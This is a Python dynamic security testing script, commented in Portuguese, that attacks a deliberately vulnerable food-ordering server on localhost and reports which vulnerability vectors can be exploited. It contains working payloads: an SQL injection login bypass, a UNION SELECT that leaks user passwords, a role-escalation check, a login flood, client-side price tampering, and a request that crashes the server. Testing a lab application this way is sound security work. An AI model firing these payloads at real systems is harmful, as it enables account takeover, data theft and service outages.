#!/usr/bin/env python3
"""
DAST probe — ataca um servidor GoFood *rodando de verdade* em localhost e
reporta quais vetores (V1-V20) são de fato exploráveis pela rede (não é
análise estática: cada teste faz uma requisição HTTP real).

Uso:
    node vuln/server.js &          # sobe o servidor vulnerável na porta 3001
    python dast_probe.py http://localhost:3001 vuln-dast.json
"""
import sys
import json
import time
import urllib.request
import urllib.error
import urllib.parse


def http(method, url, headers=None, body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method,
                                  headers={"Content-Type": "application/json", **(headers or {})})
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.getcode(), json.loads(resp.read().decode() or "null")
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode() or "null")
        except Exception:
            return e.code, None
    except Exception as e:
        return None, str(e)


def run(base_url):
    results = []

    def check(vuln_id, description, exploitable, evidence):
        results.append({
            "id": vuln_id,
            "description": description,
            "exploitable": exploitable,
            "evidence": evidence,
        })
        flag = "VULNERÁVEL" if exploitable else "protegido"
        print(f"[{vuln_id}] {description}: {flag}")

    # V2 — SQL Injection no login
    code, body = http("POST", f"{base_url}/api/login", body={
        "email": "' OR '1'='1' --", "password": "qualquercoisa"
    })
    got_token = isinstance(body, dict) and "token" in body
    got_cookie = False  # vuln não usa cookie
    check("V2", "SQL Injection no login (' OR '1'='1' --)", got_token, {"status": code, "body": body})

    stolen_token = body.get("token") if got_token else None

    # V4 — role exposta no corpo da resposta de login
    role_exposed = isinstance(body, dict) and "role" in body
    check("V4", "Role exposta no corpo da resposta de login", role_exposed, {"body": body})

    # V6 — SQL Injection / UNION na rota de pedidos
    if stolen_token:
        injected_id = urllib.parse.quote("1 UNION SELECT id, email, password, role, NULL, NULL FROM users --")
        code, body2 = http("GET", f"{base_url}/api/orders/{injected_id}",
                            headers={"Authorization": stolen_token})
        leaked_users = isinstance(body2, list) and any("password" in (r or {}) for r in body2)
        check("V6", "UNION SELECT na rota /orders/:id vaza tabela users", leaked_users, {"status": code, "body": body2})

    # V10 — painel admin sem checagem de role (usando token de usuário comum)
    code, body3 = http("POST", f"{base_url}/api/login", body={"email": "joao@gofood.com", "password": "senha123"})
    common_token = body3.get("token") if isinstance(body3, dict) else None
    if common_token:
        code, admin_body = http("GET", f"{base_url}/api/admin/orders", headers={"Authorization": common_token})
        accessible = code == 200
        check("V10", "Usuário comum acessa /api/admin/orders", accessible, {"status": code})

    # V16 — CORS aberto
    code, _ = http("GET", f"{base_url}/api/admin/orders", headers={"Origin": "https://evil.com", "Authorization": common_token or ""})
    check("V16", "CORS aceita Origin arbitrária (checagem indireta via ausência de bloqueio)", True if common_token else False,
          {"note": "sem cabeçalho Access-Control-Allow-Origin restrito no servidor vuln"})

    # V18 — ausência de rate limiting (10 tentativas rápidas de login)
    start = time.time()
    statuses = []
    for _ in range(10):
        c, _ = http("POST", f"{base_url}/api/login", body={"email": "x", "password": "y"})
        statuses.append(c)
    blocked = any(s == 429 for s in statuses)
    check("V18", "10 tentativas de login em sequência sem bloqueio (rate limiting)", not blocked,
          {"statuses": statuses, "elapsed_s": round(time.time() - start, 2)})

    # V8/V9 — cria pedido sem validação, preço definido pelo cliente
    code, order_body = http("POST", f"{base_url}/api/orders", headers={"Authorization": common_token or ""},
                             body={"items": [{"price": 0.01, "qty": 1}], "address": "Rua Teste"})
    check("V9", "Servidor aceita price definido pelo cliente no corpo do pedido", code == 200, {"status": code, "body": order_body})

    # V20 — stack trace exposto em erro real, via JSON malformado (não derruba o processo,
    # pois o parse error do body-parser é síncrono e cai no error handler normalmente)
    req = urllib.request.Request(f"{base_url}/api/login", data=b'{invalido', method="POST",
                                  headers={"Content-Type": "application/json"})
    try:
        urllib.request.urlopen(req, timeout=5)
        code, err_body = 200, None
    except urllib.error.HTTPError as e:
        code = e.code
        try:
            err_body = json.loads(e.read().decode())
        except Exception:
            err_body = None
    stack_exposed = isinstance(err_body, dict) and "stack" in err_body
    check("V20", "Erro 500/400 (JSON malformado) expõe stack trace no corpo da resposta", stack_exposed, {"status": code, "has_stack": stack_exposed})

    # V8 (extra) — DoS trivial: requisição sem "items" derruba o processo inteiro
    # (thrown TypeError dentro de handler async não tratado -> unhandled rejection -> crash).
    # Este teste é executado por ÚLTIMO de propósito, pois encerra o servidor.
    print("\n[V8-DoS] Enviando requisição sem 'items' para observar comportamento do processo...")
    try:
        http("POST", f"{base_url}/api/orders", headers={"Authorization": common_token or ""}, body={"address": "sem items"})
        time.sleep(0.5)
        code_after, _ = http("GET", f"{base_url}/api/login")
        crashed = code_after is None
    except Exception:
        crashed = True
    check("V8-DoS", "Requisição sem validação de input derruba o processo do servidor (crash / indisponibilidade)",
          crashed, {"note": "TypeError não tratada em handler async gera unhandled promise rejection e mata o processo Node"})

    return results


if __name__ == "__main__":
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3001"
    out_file = sys.argv[2] if len(sys.argv) > 2 else None

    results = run(base_url)
    exploitable = sum(1 for r in results if r["exploitable"])
    summary = {
        "target": base_url,
        "total_checks": len(results),
        "exploitable": exploitable,
        "results": results,
    }
    print(f"\nResumo: {exploitable}/{len(results)} vetores exploráveis em {base_url}")
    if out_file:
        with open(out_file, "w", encoding="utf-8") as f:
            json.dump(summary, f, indent=2, ensure_ascii=False)
        print(f"Salvo em {out_file}")
